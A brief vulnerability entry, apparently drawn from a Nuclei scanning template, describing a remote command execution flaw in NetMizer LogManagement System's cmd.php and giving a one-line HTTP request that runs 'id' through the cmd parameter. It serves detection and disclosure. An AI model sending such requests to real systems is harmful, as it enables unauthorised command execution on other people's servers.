# Vulnerability: NetMizer LogManagement System cmd.php - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`netmizer-cmd-rce.yaml`)

## Description
Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/data/manage/cmd.php?cmd=id
```

